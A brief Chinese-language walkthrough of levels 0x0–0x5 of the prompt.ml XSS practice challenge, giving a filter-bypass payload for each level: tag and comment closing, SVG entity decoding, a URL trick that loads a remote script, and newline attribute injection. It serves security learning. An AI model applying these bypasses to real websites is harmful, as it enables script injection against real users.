http://prompt.ml/0  
注意在这里使用的过关方法是prompt(1)

# 0x0
直接闭合value：
```
"><script type=text/javascript>prompt(1)</script>
```

# 0x1
服务器端将<>内的内容过滤，通过少输入一个>绕过，不影响运行：
```
<body onload="prompt(1)"
```

# 0x2
服务器端将“=”和“(“过滤，一开始查了一圈也没找到绕过等号的方法，后来借鉴别人的方法，发现“使用SVG标签，会提前将将XML实体解析再加入标签”，所以构造：
```
<svg><script>prompt&#x28;1)</script>
```

# 0x3
服务器端将”->“转换成“_”是为了防止闭合注释，但“\<!--”可以通过“-->”和“--!>”两种方式闭合：
```
--!><script type=text/javascript>prompt(1)</script>
```

# 0x4
匹配前面的URL格式绕过正则，并使用%2f绕过decodeURIComponent函数，最后使用自己的服务器上在js文件中写入prompt(1)：
```
http://prompt.ml%2f@http://xx.xx.xx.xx/1.js
```

# 0x5
“>”和“on=xxx“被正则转义，通过将type覆盖为image，并通过换行绕过正则：
```
" type=image src onerror
="prompt(1)
```
